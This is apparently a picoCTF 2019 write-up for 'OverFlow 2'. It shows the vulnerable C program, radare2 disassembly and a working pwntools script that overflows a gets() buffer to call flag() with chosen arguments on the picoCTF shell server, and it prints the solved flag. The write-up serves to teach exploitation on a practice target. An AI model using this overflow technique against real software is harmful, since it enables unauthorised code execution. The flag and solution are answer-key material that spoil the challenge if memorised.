# OverFlow 2
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Here we need to call `flag(0xDEADBEEF, 0xC0DED00D)`. To work out how to do this we again use radare2

```bash
$r2 vuln
 -- Welcome back, lazy human!
[0x080484d0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x080484d0]> afl~flag
0x080485e6    8 144          sym.flag
[0x080484d0]> pdf @ sym.vuln
/ (fcn) sym.vuln 63
|   sym.vuln ();
|           ; var char *s @ ebp-0xb8
|           ; var int32_t var_4h @ ebp-0x4
|           ; CALL XREF from main (0x8048717)
|           0x08048676      55             push ebp
|           0x08048677      89e5           mov ebp, esp
|           0x08048679      53             push ebx
|           0x0804867a      81ecb4000000   sub esp, 0xb4
|           0x08048680      e89bfeffff     call sym.__x86.get_pc_thunk.bx
|           0x08048685      81c37b190000   add ebx, 0x197b
|           0x0804868b      83ec0c         sub esp, 0xc
|           0x0804868e      8d8548ffffff   lea eax, [s]
|           0x08048694      50             push eax                    ; char *s
|           0x08048695      e896fdffff     call sym.imp.gets           ; char *gets(char *s)
|           0x0804869a      83c410         add esp, 0x10
|           0x0804869d      83ec0c         sub esp, 0xc
|           0x080486a0      8d8548ffffff   lea eax, [s]
|           0x080486a6      50             push eax                    ; const char *s
|           0x080486a7      e8b4fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080486ac      83c410         add esp, 0x10
|           0x080486af      90             nop
|           0x080486b0      8b5dfc         mov ebx, dword [var_4h]
|           0x080486b3      c9             leave
\           0x080486b4      c3             ret
[0x080484d0]> pdf @ sym.flag
/ (fcn) sym.flag 144
|   sym.flag (uint32_t arg_8h, uint32_t arg_ch);
|           ; var char *format @ ebp-0x4c
|           ; var file*stream @ ebp-0xc
|           ; var int32_t var_4h @ ebp-0x4
|           ; arg uint32_t arg_8h @ ebp+0x8
|           ; arg uint32_t arg_ch @ ebp+0xc
|           0x080485e6      55             push ebp
|           0x080485e7      89e5           mov ebp, esp
|           0x080485e9      53             push ebx
|           0x080485ea      83ec54         sub esp, 0x54               ; 'T'
|           0x080485ed      e82effffff     call sym.__x86.get_pc_thunk.bx
|           0x080485f2      81c30e1a0000   add ebx, 0x1a0e
|           0x080485f8      83ec08         sub esp, 8
|           0x080485fb      8d83b0e7ffff   lea eax, [ebx - 0x1850]
|           0x08048601      50             push eax                    ; const char *mode
|           0x08048602      8d83b2e7ffff   lea eax, [ebx - 0x184e]
|           0x08048608      50             push eax                    ; const char *filename
|           0x08048609      e892feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
|           0x0804860e      83c410         add esp, 0x10
|           0x08048611      8945f4         mov dword [stream], eax
|           0x08048614      837df400       cmp dword [stream], 0
|       ,=< 0x08048618      751c           jne 0x8048636
|       |   0x0804861a      83ec0c         sub esp, 0xc
|       |   0x0804861d      8d83bce7ffff   lea eax, [ebx - 0x1844]
|       |   0x08048623      50             push eax                    ; const char *s
|       |   0x08048624      e837feffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048629      83c410         add esp, 0x10
|       |   0x0804862c      83ec0c         sub esp, 0xc
|       |   0x0804862f      6a00           push 0                      ; int status
|       |   0x08048631      e83afeffff     call sym.imp.exit           ; void exit(int status)
|       |   ; CODE XREF from sym.flag (0x8048618)
|       `-> 0x08048636      83ec04         sub esp, 4
|           0x08048639      ff75f4         push dword [stream]         ; FILE *stream
|           0x0804863c      6a40           push 0x40                   ; '@' ; 64 ; int size
|           0x0804863e      8d45b4         lea eax, [format]
|           0x08048641      50             push eax                    ; char *s
|           0x08048642      e8f9fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x08048647      83c410         add esp, 0x10
|           0x0804864a      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef ; [0x8:4]=-1 ; 3735928559
|       ,=< 0x08048651      751a           jne 0x804866d
|       |   0x08048653      817d0c0dd0de.  cmp dword [arg_ch], 0xc0ded00d ; [0xc:4]=-1 ; 3235827725
|      ,==< 0x0804865a      7514           jne 0x8048670
|      ||   0x0804865c      83ec0c         sub esp, 0xc
|      ||   0x0804865f      8d45b4         lea eax, [format]
|      ||   0x08048662      50             push eax                    ; const char *format
|      ||   0x08048663      e8b8fdffff     call sym.imp.printf         ; int printf(const char *format)
|      ||   0x08048668      83c410         add esp, 0x10
|     ,===< 0x0804866b      eb04           jmp 0x8048671
|     |||   ; CODE XREF from sym.flag (0x8048651)
|     ||`-> 0x0804866d      90             nop
|     ||,=< 0x0804866e      eb01           jmp 0x8048671
|     |||   ; CODE XREF from sym.flag (0x804865a)
|     |`--> 0x08048670      90             nop
|     | |   ; CODE XREFS from sym.flag (0x804866b, 0x804866e)
|     `-`-> 0x08048671      8b5dfc         mov ebx, dword [var_4h]
|           0x08048674      c9             leave
\           0x08048675      c3             ret
[0x080484d0]> 
```
What do we learn from this:

- `flag` is at `0x080485e6`
- `buf` is at `ebp-0xb8`
- `0xdeadbeef` is `cmp`d to `arg_8h` at `ebp+0x8` (+8)
- `0xc0ded00d` is `cmp`d to `arg_ch` at `ebp+0xc` (+12)

A few mods on [overflow1](../3-overflow-1) does the trick:
```python
from os import environ
from pwn import *

PATH='/problems/overflow-2_5_4db6d300831e973c59360066ec1cf0a4'
EXEC='vuln'

flag_call_adr = 0x080485e6
a1 = 0xDEADBEEF
a2 = 0xC0DED00D

send = (0xb8+4)*b'x' + p32(flag_call_adr) + b'x'*4 + p32(a1) + p32(a2)

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Please enter your string: ', send)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
```
flag: `picoCTF{arg5_and_r3turn5f5d490e6}`


